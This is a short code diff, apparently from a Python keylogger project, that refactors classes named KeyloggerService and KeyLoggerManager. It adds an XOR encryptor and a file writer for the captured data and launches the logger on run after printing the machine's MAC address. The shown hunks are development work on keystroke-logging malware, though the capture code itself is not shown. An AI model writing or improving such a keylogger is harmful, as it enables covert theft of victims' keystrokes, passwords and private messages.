@@ -43,7 +43,7 @@ class KeyloggerService:
         self.current_app = None
 
     def __change_action(self):
-        self.__action = not (self.__action)
+        self.__action = not self.__action
 
 
     def __exit_point(self):
@@ -157,12 +157,15 @@ class KeyLoggerManager:
 
     def __init__(self):
         self.instance = KeyloggerService()
+        self.encryptor : IEncryptor = XorEncryptor()
+        self.writer : IWriter = FileWriter()
+
 
     def start(self):
         self.instance.start()
 
     def write_to_file(self):
-        FileWriter().write(self.instance.get_data())
+        self.writer.write(self.instance.get_data())
 
     def main(self):
         threading.Thread(target=self.start).start()
@@ -173,8 +176,12 @@ class KeyLoggerManager:
             time.sleep(5)
 print(get_mac_address())
 
+
 A = KeyLoggerManager()
 A.main()
+
+
+
 
 
 
